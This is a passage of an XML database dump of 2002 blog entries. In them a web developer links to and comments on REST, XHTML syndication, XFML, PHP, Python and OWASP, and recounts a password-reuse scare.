		<field name="body">&lt;p&gt;Aquarionics is &lt;a href=&quot;http://www.aquarionics.com/&quot;&gt;Gone&lt;/a&gt; (well, not entirely - the old site can still be found &lt;a href=&quot;http://www.aquarionics.com/oldindex.php&quot; title=&quot;[Aquarionics] Journal&quot;&gt;here&lt;/a&gt;). Aquarion has committed to building his new blogging system, Epistula 2, and vowed not to add any more entries until the new system is capable of taking them. Development of the new system will continue in the open at &lt;a href=&quot;http://playground.aquarionics.com/&quot;&gt;playground.aquarionics.com&lt;/a&gt;, which is currently throwing an HTTP 500 error but is likely to be an interesting place to watch in the next few days.&lt;/p&gt;</field>
		<field name="created">2002-11-23 10:41:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">606</field>
		<field name="title">RESTLog</field>
		<field name="slug">RESTLog</field>
		<field name="body">&lt;p&gt;Joe Gregorio's &lt;a href=&quot;http://wellformedweb.org/&quot;&gt;RESTLog&lt;/a&gt; is a fascinating piece of technology and a great example of the &lt;acronym title=&quot;REpresentational State Transfer&quot;&gt;REST&lt;/acronym&gt;ian model of web service in action. Everything is built on &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; and &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; - new blog entries are POSTed to the index page as &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; 2.0 item elements, edits are done with the little-used HTTP PUT method and the DELETE method can be used to delete items. Content negotiation is in effect, so browsers recieve &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; while aggregators theoretically get RSS (though in practise existing aggregators fail to send a content negotiation header so an alternative &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; scheme must be used). It's very clever stuff. Further techie details are being posted on a regular basis, but a good overview can be had by reading &lt;a href=&quot;http://wellformedweb.org/RESTLog.cgi/2&quot;&gt;RESTLog Overview&lt;/a&gt; and &lt;a href=&quot;http://wellformedweb.org/RESTLog.cgi/5&quot;&gt;RESTLog Interface&lt;/a&gt;. The system was inspired by the RESTWiki's &lt;a href=&quot;http://internet.conveyor.com/RESTwiki/moin.cgi/RestifyingBlogger&quot;&gt;RestidyingBlogger&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-23 19:08:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">607</field>
		<field name="title">Mimeo</field>
		<field name="slug">mimeo</field>
		<field name="body">&lt;p&gt;Brian Graf has some &lt;a href=&quot;http://www.codingwith.net/weblog/archive.aspx?postID=13&quot; title=&quot;Mimeo&quot;&gt;very positive things&lt;/a&gt; to say about Mimeo, an innovative new web services based company in the States:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.codingwith.net/weblog/archive.aspx?postID=13&quot;&gt;&lt;p&gt;
The concept is simple enough. You download and install some software that registers a new printer driver on your system. Whenever you print a document using that driver, your document is rendered - securely I might add - to Mimeo's server. Once it's uploaded, your browser takes you to Mimeo's site. There you are presented with the most intuitive web application I have ever seen which walks you through the process of creating a professional document, including paper choices, binding styles, covers, tab dividers, etc. You are even shown a rendered proof of your document online so you can make sure it's exactly what you want. When you are satisfied, you enter your payment and delivery information and the document is sent to you via FedEx. It is so easy.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-11-23 19:10:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">608</field>
		<field name="title">Information wants to be free</field>
		<field name="slug">informationWantsToBeFree</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://www.plasticbag.org/files/old/003188.shtml&quot;&gt;Apple and the Pirate Everyman&lt;/a&gt;, Tom Coates discusses Apple's attitude to copy protection and open standards. Choice quote:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.plasticbag.org/files/old/003188.shtml&quot;&gt;&lt;p&gt;
The reasons for all this, of course, are that - for good or ill - at the moment copyrighted material and intellectual property are endangered and cornered beasts anyway. As yet no-one really knows the effects of this development, but I think it is clear to all concerned that (whether or not it is really happening at the moment) the gradual increase in technology, bandwidth and storage capacity provides an enormous potential for simply routing around traditional media-distribution outlets.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-11-23 19:38:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">609</field>
		<field name="title">Get the look</field>
		<field name="slug">getTheLook</field>
		<field name="body">&lt;p&gt;Adam Polselli is a talented young designer who posts regularly on the SitePoint Forums. &lt;a href=&quot;http://www.adampolselli.com/getthelook/&quot;&gt;Get The Look&lt;/a&gt; is his new site (based on an &lt;a href=&quot;http://www.webmasterbase.com/article/796/&quot; title=&quot;Get The Look - Design Templates&quot;&gt;article&lt;/a&gt; he wrote for SitePoint) which provides five excellent site templates and explains the design principles that were used to create them. I'm personally not interested in free site templates (though with my terrible design skills I probably should be) but the site is well worth visiting for the excellent advice provided with each design.&lt;/p&gt;</field>
		<field name="created">2002-11-23 19:43:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">610</field>
		<field name="title">Polluting the web</field>
		<field name="slug">pollutingTheWeb</field>
		<field name="body">&lt;p&gt;Hixie and Aaron Swartz are &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-archive/2002Nov/thread.html#59&quot; title=&quot;Why your XHTML article is wrong&quot;&gt;debating&lt;/a&gt; Hixie's infamous &lt;a href=&quot;http://www.hixie.ch/advocacy/xhtml&quot;&gt;Sending XHTML as text/html Considered Harmful&lt;/a&gt; on a W3C mailing list. While I am just as guilty of sending XHTML as text/html as anyone else (I've been meaning to fix this for a while but just haven't found time yet) I'll stick in an argument that Hixie hasn't used yet. Sending XHTML as text/html basically amounts to &lt;em&gt;pollution&lt;/em&gt; of the web. As far as the XML user agents of the future are concerned (which are supposedly one of the main reasons we use XHTML) an invalid XHTML document is unparseable and thus unreadable. Anyone who has tried to keep an XHTML blog valid will know how difficult it is to keep it that way, and without a browser refusing to display the document (as happened with Mozilla and diveintomark the other day thanks to an XML content type and a missing end tag) it can be all to easy to contribute to the pollution. As it stands, a massive proportion of the supposedly XHTML web may as well be just so many random floating bytes.&lt;/p&gt;</field>
		<field name="created">2002-11-24 09:21:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">611</field>
		<field name="title">phpPatterns</field>
		<field name="slug">phpPatterns</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.phppatterns.com/&quot;&gt;phpPatterns&lt;/a&gt; is a brand new site which advocates and documents the use of object oriented design patterns with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;. It's a great concept and the site already has some impressive content (although it could really do with a PHP references tutorial). The site is a project of Harry Fuecks, a regular contributor to &lt;a href=&quot;http://www.sitepointforums.com/forumdisplay.php?forumid=34&quot;&gt;SitePoint's PHP forums&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-24 16:13:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">612</field>
		<field name="title">OWASP Security guide</field>
		<field name="slug">owaspGuide</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.owasp.org/&quot;&gt;Open Web Application Security Project&lt;/a&gt; (&lt;acronym title=&quot;Open Web Application Security Project&quot;&gt;OWASP&lt;/acronym&gt;) have a &lt;a href=&quot;http://www.owasp.org/guide/&quot; title=&quot;About the OWASP Guide&quot;&gt;free guide&lt;/a&gt; to building secure web applications, which covers a large range of common problems such as cross site scripting and &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; injection vulnerabilities. The report is a 60 page &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt; and although I haven't had time to go through it yet it looks like an excellent read.&lt;/p&gt;</field>
		<field name="created">2002-11-24 21:19:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">613</field>
		<field name="title">Taxomita</field>
		<field name="slug">taxomita</field>
		<field name="body">&lt;p&gt;XFMLManager, Peter Van Dijck's &lt;acronym title=&quot;XML Faceted Metadata Language&quot;&gt;XFML&lt;/acronym&gt; construction and navigation tool to which I have contributed various chunks of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; related code, has been &lt;a href=&quot;http://poorbuthappy.com/ease/000617.html&quot;&gt;renamed Taxomita&lt;/a&gt; and given a &lt;a href=&quot;http://taxomita.com/&quot;&gt;brand new site&lt;/a&gt;. Peter hopes to have a public beta out within the next few weeks. It also has a &lt;a href=&quot;http://groups.yahoo.com/group/taxomita/&quot; title=&quot;Taxomita user group&quot;&gt;mailing list&lt;/a&gt;. Meanwhile, XFML has been cropping up all over the place even despite the current lack of software, with the most recent sighting occurring over at Bill Kearney's &lt;a href=&quot;http://www.syndic8.com/~wkearney/blogs/syndic8/&quot;&gt;Syndication News&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-24 21:53:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">614</field>
		<field name="title">Syndicating blogs with XHTML</field>
		<field name="slug">syndicatingBlogsWithXHTML</field>
		<field name="body">&lt;p&gt;Anil Dash &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/004158.php&quot; title=&quot;syndication formats?&quot;&gt;suggests&lt;/a&gt; using structured XHTML as a blog syndication format. &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_11#a000469&quot; title=&quot;Semantic Overloading&quot;&gt;Scott Andrew&lt;/a&gt; points out that this has semantic problems in that it would mean using the class attribute to add additional meaning to a document. I was going to say that this would be an ideal opportunity to mix different namespaces in one XML document (as &lt;a href=&quot;http://www.alistapart.com/stories/inlinexml/&quot; title=&quot;Inline XML&quot;&gt;described&lt;/a&gt; by Lachlan Cannon) but techno-weenie &lt;a href=&quot;http://techno-weenie.com/archives/2002/11/24/000058.php#more&quot; title=&quot;XHTML syndication&quot;&gt;beat me to it&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-24 22:01:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">615</field>
		<field name="title">CSS filter guide</field>
		<field name="slug">cssFilterGuide</field>
		<field name="body">&lt;p&gt;Spotted on the &lt;a href=&quot;http://www.pierce.ctc.edu/test/weblog/2002_11_17_archive.html#85708609&quot; title=&quot;ooh, neat&quot;&gt;Web Manager's Weblog&lt;/a&gt;, &lt;a href=&quot;http://centricle.com/ref/css/filters/&quot;&gt;centricle : css filters&lt;/a&gt; is a list of all of the current &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; browser hiding techniques (all 17 of them!) along with a table showing which hack will hide things from which browser. Best of all, the name of each workaround is a link which will pop open a new window testing the hack in your browser.&lt;/p&gt;</field>
		<field name="created">2002-11-24 22:09:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">616</field>
		<field name="title">Validator documentation</field>
		<field name="slug">validatorDocumented</field>
		<field name="body">&lt;p&gt;It seems the W3C have made some changes to their &lt;a href=&quot;http://validator.w3.org:8001/&quot;&gt;beta validator&lt;/a&gt;'s XML output option. The bad news is that this has (temporarily) broken my &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/28/#w3cValidatorWebService&quot;&gt;web service interface&lt;/a&gt;, but the good news is that the feature is now &lt;a href=&quot;http://validator.w3.org:8001/docs/users.html#Interpret&quot; title=&quot;Interpreting the results&quot;&gt;documented&lt;/a&gt; on the W3C's site. Hopefully I'll get a chance to fix the web service interface in the near future, but it will remain a toy rather than a tool for as long as the validator's interface has not been frozen.&lt;/p&gt;</field>
		<field name="created">2002-11-24 23:59:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">617</field>
		<field name="title">Nervous</field>
		<field name="slug">nervous</field>
		<field name="body">&lt;p&gt;No time to update tonight. I'm frantically putting together a 2 hour training course on &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;, &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; and mySQL which I shall be presenting tomorrow as my first ever experience of teaching a large(ish) group. Should be interesting.&lt;/p&gt;

&lt;p&gt;In the meantime though, a bellated happy birthday to Mark Pilgrim. If you haven't read his &lt;a href=&quot;http://diveintomark.org/archives/2002/11/24.html#how_i_turned_30&quot; title=&quot;How I turned 30&quot;&gt;tragi-comical account&lt;/a&gt; of the big day yet you're missing out on a blogging treat.&lt;/p&gt; </field>
		<field name="created">2002-11-25 23:01:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">618</field>
		<field name="title">Coursework coursework...</field>
		<field name="slug">courseworkCoursework</field>
		<field name="body">&lt;p&gt;No, I'm not dead - I'm just weighed under with coursework. Two large group projects and a whole bunch of personal pieces are conspiring to make me feel gulity whenever I load up a browser window. It'll all be over by December the 17th thank Goodness. For the moment though I'm taking a well earned break to catch up on the goings on in the blogosphere over the past few days.&lt;/p&gt;</field>
		<field name="created">2002-11-28 23:15:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">619</field>
		<field name="title">PHP training update</field>
		<field name="slug">phpTrainingUpdate</field>
		<field name="body">&lt;p&gt;The aforementioned PHP training system was a mixed success. On the one hand, I discovered that trying to teach a room full of people is a lot tougher than I had expected (to cut a long story short, I stumbled through about five minutes of reiterating the same few points before all present agreed that the session would be best run using the ask-questions-when-you-get-stuck format). Luckily I had prepared some &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/php-training/&quot; title=&quot;PHP training session&quot;&gt;pretty comprehensive support material&lt;/a&gt; the night before. I'm chalking that one down to experience.&lt;/p&gt;</field>
		<field name="created">2002-11-28 23:23:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">620</field>
		<field name="title">Python as middleware</field>
		<field name="slug">pythonPower</field>
		<field name="body">&lt;p&gt;OpenEnterpriseTrends.com: &lt;a href=&quot;http://www.oetrends.com/cgi-bin/page_display.cgi?98&quot;&gt;Python Power: Growing Respect for an Open Source Integration Tool&lt;/a&gt;. Another excellent piece of Python advocacy, this time highlighting Python's power and flexibility as a middleware tool to glue together varous large enterprise systems.&lt;/p&gt;</field>
		<field name="created">2002-11-28 23:24:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">621</field>
		<field name="title">Syndication is not publication</field>
		<field name="slug">syndicationIsNotPublication</field>
		<field name="body">&lt;p&gt;Mark Pilgrim pretty much &lt;a href=&quot;http://diveintomark.org/archives/2002/11/26.html#syndication_is_not_publication&quot; title=&quot;Syndication is not publication&quot;&gt;single handedly killed&lt;/a&gt; the discussion thread on syndicating weblog content with XHTML started &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/004158.php&quot; title=&quot;syndication formats?&quot;&gt;a few days ago&lt;/a&gt; by Anil Dash. &lt;a href=&quot;http://www.kryogenix.org/days/000378.cas&quot; title=&quot;What&amp;apos;s the point in XHTML?&quot;&gt;Stuart's reply&lt;/a&gt; to Mark's post is definitely worth a read though.&lt;/p&gt;</field>
		<field name="created">2002-11-28 23:24:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">622</field>
		<field name="title">XFML for Radio</field>
		<field name="slug">xfmlForRadio</field>
		<field name="body">&lt;p&gt;Spotted on Guide to ease: &lt;a href=&quot;http://poorbuthappy.com/ease/000631.html&quot;&gt;Bill Kearney has written an XFML tool for Radio Userland&lt;/a&gt;. This sounds great - I'd love to see an example of a Radio blog that is using this.&lt;/p&gt;</field>
		<field name="created">2002-11-28 23:31:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">623</field>
		<field name="title">OSAF hire Robin Dunn</field>
		<field name="slug">osafHireRobinDunn</field>
		<field name="body">&lt;p&gt;If you weren't already exited about the &lt;acronym title=&quot;Open Source Applications Foundation&quot;&gt;OSAF&lt;/acronym&gt;, maybe it's time you were. I just spotted on Mitch Kapor's blog that &lt;a href=&quot;http://blogs.osafoundation.org/mitch/000047.html#000047&quot; title=&quot;New Faces at OSAF&quot;&gt;they've hired Robin Dunn&lt;/a&gt; (of &lt;a href=&quot;http://wxpython.org/&quot;&gt;wxPython&lt;/a&gt; fame, and winner of the &lt;a href=&quot;http://www.activestate.com/Corporate/Awards/ActiveAwards.html&quot;&gt;ActiveState 2002 Python award&lt;/a&gt;) on a 6 month contract to work on improvements to wxWindows and wxPython. They've also hired Mitchell Baker, Mozilla.org's &quot;Chief Lizard Wrangler&quot; on a part time contract that helps fund her work on Mozilla while letting OSAF take advantage of her extensive experience of co-ordinating community open source efforts. Hiring Robin Dunn makes very good sense, seeing as the bulk of Chandler's &lt;a href=&quot;http://www.osafoundation.org/technology.htm&quot; title=&quot;OSAF Technology&quot;&gt;code&lt;/a&gt; will be written in Python with wxPython used for the front end. Any worries that Chandler &lt;a href=&quot;http://blogs.osafoundation.org/mitch/000033.html#000033&quot; title=&quot;What to Worry About&quot;&gt;might turn out to be vapourware&lt;/a&gt; have vanished from my mind - I can't wait to see what they come up with.&lt;/p&gt;</field>
		<field name="created">2002-11-29 23:04:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">624</field>
		<field name="title">Conversation with Martin Fowler</field>
		<field name="slug">conversationWithMartinFowler</field>
		<field name="body">&lt;p&gt;A conversation with Martin Fowler, parts &lt;a href=&quot;http://www.artima.com/intv/refactor.html&quot; title=&quot;Refactoring with Martin Fowler&quot;&gt;I&lt;/a&gt;, &lt;a href=&quot;http://www.artima.com/intv/principles.html&quot; title=&quot;Design Principles and Code Ownership&quot;&gt;II&lt;/a&gt;, &lt;a href=&quot;http://www.artima.com/intv/evolution.html&quot; title=&quot;Evolutionary Design&quot;&gt;III&lt;/a&gt; and &lt;a href=&quot;http://www.artima.com/intv/flexplex.html&quot; title=&quot;Flexibility and Complexity&quot;&gt;IV&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-29 23:43:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">625</field>
		<field name="title">rel=&quot;bookmark&quot;</field>
		<field name="slug">relEqualsBookmark</field>
		<field name="body">&lt;p&gt;Mental note: add the &lt;code&gt;rel=&quot;bookmark&quot;&lt;/code&gt; attribute to my permalinks, as &lt;a href=&quot;http://tantek.com/log/2002/11.html#L20021124t1454&quot; title=&quot;More on XHTML syndication&quot;&gt;recommended&lt;/a&gt; by Tantek. I'd never realised the rel attribute could be applied to normal hyperlinks.&lt;/p&gt;</field>
		<field name="created">2002-11-29 23:57:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">626</field>
		<field name="title">Blogdex spammed</field>
		<field name="slug">blogdexSpammed</field>
		<field name="body">&lt;p&gt;Uh oh, looks like &lt;a href=&quot;http://blogdex.media.mit.edu/&quot;&gt;Blogdex has been spammed&lt;/a&gt;. At the time of writing a whole bunch of the links positioned at &quot;12&quot; were &quot;PremiumDomains - &lt;em&gt;www.somedomainhere.com&lt;/em&gt; - DOMAINS FOR SALE&quot;. This is a worrying precedent - many of the services we bloggers thrive upon such as weblogs.com, blogdex and others are easy targets for spammers thanks to the open nature of the service they provide.&lt;/p&gt;</field>
		<field name="created">2002-11-30 19:02:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">627</field>
		<field name="title">PostgreSQL 7.3</field>
		<field name="slug">postGres73</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://archives.postgresql.org/pgsql-announce/2002-11/msg00004.php&quot;&gt;PostgreSQL Global Development Group Announces Version 7.3&lt;/a&gt;. I still haven't had a play with PostgreSQL yet but everything I've heard has been positive. I'm sure PostgreSQL's popularity would skyrocket if they made a Windows binary available - the ability to test scripts written in PHP and MySQL on a Windows desktop PC is the main reason I have stuck with MySQL rather than exploring PostgreSQL.&lt;/p&gt;</field>
		<field name="created">2002-11-30 20:50:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">628</field>
		<field name="title">The evolution of PHP</field>
		<field name="slug">phpEvolution</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.readinged.com/index.php?id=P17&quot; title=&quot;Happy Thanksgiving&quot;&gt;ReadingEd&lt;/a&gt;, an interesting article on &lt;a href=&quot;http://www.devx.com/webdev/Article/10007/1954&quot;&gt;the Object Oriented Evolution of PHP&lt;/a&gt; by Zeev Suraski (the &lt;em&gt;Ze&lt;/em&gt; in &lt;a href=&quot;http://www.zend.com/&quot;&gt;Zend&lt;/a&gt;). As well as a history of PHP's &lt;acronym title=&quot;Object Oriented&quot;&gt;OO&lt;/acronym&gt; support, the article provides some tasty snippets of information as to improvement to look forward to in PHP 5. Personally I can't wait for the objects to default to passing by reference, but the exception handling is going to be very nice as well:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.devx.com/webdev/Article/10007/1954&quot;&gt;
&lt;p&gt;
Finally, the Zend Engine 2 also adds exception handling to PHP. To date, the sad reality is that most developers write code that does not handle error situations gracefully. It's not uncommon to see sites that spit out cryptic database errors to your browser, rather than displaying a more user-friendly &quot;An error has occurred&quot; message. A key reason for this is that handling error situations with the versions of PHP was a daunting task - you actually had to check the return value of each and every function. Adding a set_error_handler() function made managing errors slightly easier, - but still left a lot to be desired. Adding exception handling to PHP lets developers achieve fine-grained error recovery, but more importantly, it facilitates graceful application-wide error recovery.
&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-11-30 21:00:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">629</field>
		<field name="title">Why computer books suck</field>
		<field name="slug">whyComputerBooksSuck</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.ramblingrose.com/ComputerBooks.htm&quot;&gt;Why Computer Books Suck&lt;/a&gt;. The principle argument seems to be that most authors get burned by their first experience and avoid writing further books, leading to the bulk of computer books being written by newbies. One of my long term ambitions is to write a book on a geeky topic - I haven't been put off yet, but the prospect does seem slightly less appealing.&lt;/p&gt;</field>
		<field name="created">2002-11-30 22:00:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">630</field>
		<field name="title">XML security on SitePoint</field>
		<field name="slug">xmlSecurityOnSitePoint</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webmasterbase.com/article/933&quot;&gt;Getting Started with XML Security&lt;/a&gt; is a SitePoint article of epic proportions. I had never really looked at any of the XML security applications but this article appears to cover the lot.&lt;/p&gt;</field>
		<field name="created">2002-11-30 22:02:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">631</field>
		<field name="title">This year's Demotivators</field>
		<field name="slug">moreDemotivators</field>
		<field name="body">&lt;p&gt;This year's collection of &lt;a href=&quot;http://www.despair.com/indem.html&quot;&gt;Demotivators&lt;/a&gt; are out (via &lt;a href=&quot;http://doc.weblogs.com/2002/11/30#theGiftThatKeepsOnTaking&quot; title=&quot;The gift that keeps on taking&quot;&gt;Doc Searls&lt;/a&gt;). I think my favourite is &lt;a href=&quot;http://www.despair.com/motivation.html&quot;&gt;Motivation&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-30 23:50:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">632</field>
		<field name="title">Perl advent calendar 2002</field>
		<field name="slug">perlAdventCalendar2002</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.perladvent.org/2002/&quot;&gt;The 2002 Perl Advent Calendar&lt;/a&gt;. &lt;em&gt;Cute&lt;/em&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-02 13:57:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">633</field>
		<field name="title">No updates for a while</field>
		<field name="slug">noUpdatesForAWhile</field>
		<field name="body">&lt;p&gt;It's coursework crunch time. Deadline is Thursday, we have an application that works but doesn't work (if you get what I mean) and it looks like I will be spending the next few days immersed in Java. Fun fun fun.&lt;/p&gt;</field>
		<field name="created">2002-12-02 13:59:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">634</field>
		<field name="title">Taking a break</field>
		<field name="slug">takingABreak</field>
		<field name="body">&lt;p&gt;Coursework continues, but I'm taking a quick break to blog the fact that Tony Bowden has changed the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; style  for blockquotes on &lt;a href=&quot;http://www.tmtm.com/insanity/&quot;&gt;Understanding Nothing&lt;/a&gt;. This may not be earth shattering news, but considering Tony's blogging technique (entries frequently consist of large blockquotes) and previous blockquote style (grey italic text) the new format makes an excellent blog a great deal more readable.&lt;/p&gt;</field>
		<field name="created">2002-12-04 20:23:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">635</field>
		<field name="title">Coursework complete</field>
		<field name="slug">courseworkComplete</field>
		<field name="body">&lt;p&gt;Coursework finished. It still has some niggling bugs but, as a group, we have agreed to stick them in a &quot;known issues&quot; list and forget about them.&lt;/p&gt;</field>
		<field name="created">2002-12-05 01:16:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">636</field>
		<field name="title">Mark goes XFML</field>
		<field name="slug">markGoesXfml</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has &lt;a href=&quot;http://diveintomark.org/archives/2002/12/03.html#this_is_xfml&quot; title=&quot;This is XFML&quot;&gt;discovered XFML&lt;/a&gt;. He provides an excellent description of the standard, but fails to mention XFML's most powerful ability; sharing metadata. Here's how it works:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;You find another site with similar topics to you that publishes their data in XFML.&lt;/li&gt;
&lt;li&gt;You set up your XFML software (for the moment you'll have to write your own, but this will change soon) to grab their map once per specified-time-period.&lt;/li&gt;
&lt;li&gt;In &lt;em&gt;your&lt;/em&gt; XFML map, you use the &lt;a href=&quot;http://www.xfml.org/spec/1.0.html#topicconnect&quot;&gt;connect&lt;/a&gt; element to link topics on your map to identical / very similar topics on their map. For example, you might have a topic called &quot;Cats&quot; while they have one called &quot;Felines&quot;. The meaning is the same, so create a link between them.&lt;/li&gt;
&lt;li&gt;Whenever they publish something in that topic on their site, your software will be able to automatically link to it as &quot;related reading&quot; on your site.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This is just the tip of the iceburg - apply the creative global mindset that is the blogging community and who knows what will happen :) In the meantime, marvel at Dive Into Accessibility &lt;a href=&quot;http://facetmap.com/demo/browse.jsp?map=diveintoaccessibility&amp;amp;v=1&amp;amp;s=000000000000&quot; title=&quot;browse diveintoaccessibility FacetMap&quot;&gt;as rendered by FacetMap&lt;/a&gt;, working from the XFML document provided &lt;a href=&quot;http://diveintoaccessibility.org/diveintoaccessibility.xfml&quot; title=&quot;Dive Into Accessibility&amp;apos;s FacetMap&quot;&gt;here&lt;/a&gt;. &lt;a href=&quot;http://diveintoaccessibility.org/&quot;&gt;Dive Into Accessibility&lt;/a&gt; is a great example of faceted navigation and a perfect example of XFML in action.&lt;/p&gt;</field>
		<field name="created">2002-12-05 01:22:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">637</field>
		<field name="title">Remembering passwords</field>
		<field name="slug">rememberingPasswords</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/12/04.html#a1019&quot; title=&quot;One of the Most Useful Articles in a Long Time: How To Remember Your Passwords&quot;&gt;Scott&lt;/a&gt;, an &lt;a href=&quot;http://howto.looselycoupled.com/blog/2002_10_27_dy.htm#85623755&quot; title=&quot;How to remember all your passwords&quot;&gt;article&lt;/a&gt; with some great tips on remembering your passwords. It includes the following vitally important tip:&lt;/p&gt;
&lt;blockquote cite=&quot;http://howto.looselycoupled.com/blog/2002_10_27_dy.htm#85623755&quot;&gt;&lt;p&gt;
You may trust the provider you're signing up with, but are you confident no-one will hack into their database? If in doubt, err on the side of caution - be safe, not sorry.
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;A few years back I nearly learnt this one the hard way. An online gaming forum I had signed up for was cracked, and the password file started making its way around the less scrupulous members of the UK gaming community. The first I heard of this was when someone used my username and password form that forum to log in to my account on a different forum and post some messages. The bad news was that I had administrator access on the different forum, which at that time hav over 20,000 active members and nearly 2 million posts.&lt;/p&gt;

&lt;p&gt;Luckily the prankster in question didn't cause any damage and contacted me to warn me to change my password, but it gave me (and the other administrators of the forum) a pretty big scare.&lt;/p&gt;

&lt;p&gt;Ever since then, I have maintained a minimum of 3 passwords. I have a low security username/password for unimportant accounts, a medium level one for sites that I trust to a greater extent than the low security ones and a number of high security passwords used for ecommerce sites and important admin level accounts. I should probably start spreading myself even thinner.&lt;/p&gt;</field>
		<field name="created">2002-12-05 02:23:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">638</field>
		<field name="title">YAML</field>
		<field name="slug">yaml</field>
		<field name="body">&lt;p&gt;I forget quite how I got there, but the other day I found myself reading about &lt;acronym title=&quot;YAML Ain&amp;apos;t Markup Language&quot;&gt;YAML&lt;/acronym&gt; - &lt;a href=&quot;http://www.yaml.org/&quot;&gt;YAML Ain't Markup Language&lt;/a&gt;. It looks really interesting. YAML aims to be an easily human readable format for storing and trasferring structurered data - so far, so &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;. Where it differs from the &lt;acronym title=&quot;Information Technology&quot;&gt;IT&lt;/acronym&gt; world's favourite buzzword is that YAML is specifically designed to handle the three most common data structures - scalars (single values), lists and dictionaries. Here's a sample (taken from the &lt;a href=&quot;http://www.yaml.org/spec/&quot; title=&quot;YAML Ain&amp;apos;t Markup Language&quot;&gt;official specification&lt;/a&gt;):&lt;/p&gt;
&lt;pre&gt;
Time: 2001-11-23 15:01:42 -05:00
User: ed
